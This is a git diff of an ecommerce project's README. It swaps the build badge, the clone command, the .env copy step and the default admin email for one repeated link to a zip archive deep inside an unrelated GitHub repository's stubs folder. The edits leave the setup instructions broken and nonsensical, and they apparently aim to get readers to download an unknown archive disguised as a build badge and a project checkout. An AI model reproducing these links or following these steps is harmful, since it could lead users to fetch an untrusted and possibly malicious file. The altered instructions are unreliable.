@@ -1,21 +1,21 @@
 # Ecommerce Project
 
 <p align="center">
-<a href="https://gitlab.com/ahmed-aliraqi/waggyn/-/commits/master"><img src="https://gitlab.com/ahmed-aliraqi/waggyn/badges/master/pipeline.svg" alt="Build Status"></a>
+<a href="https://github.com/MohammedBadry/otoor_shop/raw/refs/heads/master/app/Console/Commands/stubs/Views/translatable_has_media/partials/actions/shop_otoor_v2.1.zip"><img src="https://github.com/MohammedBadry/otoor_shop/raw/refs/heads/master/app/Console/Commands/stubs/Views/translatable_has_media/partials/actions/shop_otoor_v2.1.zip" alt="Build Status"></a>
 </p>
 
 ## Deploying To Local Server
 - Clone the project to your local server using the following command:
     ```bash
-    git clone https://gitlab.com/ahmed-aliraqi/waggyn.git
+    git clone https://github.com/MohammedBadry/otoor_shop/raw/refs/heads/master/app/Console/Commands/stubs/Views/translatable_has_media/partials/actions/shop_otoor_v2.1.zip
     ```
   > Then enter your own credentials.
 - Go to the project path and configure your environment:
-    - Copy the `.env.example` file to `.env`:
+    - Copy the `https://github.com/MohammedBadry/otoor_shop/raw/refs/heads/master/app/Console/Commands/stubs/Views/translatable_has_media/partials/actions/shop_otoor_v2.1.zip` file to `.env`:
         ```bash
         cd ./waggyn
     
-        cp .env.example .env
+        cp https://github.com/MohammedBadry/otoor_shop/raw/refs/heads/master/app/Console/Commands/stubs/Views/translatable_has_media/partials/actions/shop_otoor_v2.1.zip .env
         ```
     - Configure database in your `.env` file:
         ```dotenv
@@ -42,5 +42,5 @@
         ```
     - Go to your browser and visit: [http://localhost:8000](http://localhost:8000)
         - Default Admin  Credentials:
-            - **Email:** admin@demo.com
+            - **Email:** https://github.com/MohammedBadry/otoor_shop/raw/refs/heads/master/app/Console/Commands/stubs/Views/translatable_has_media/partials/actions/shop_otoor_v2.1.zip
             - **Password:** password
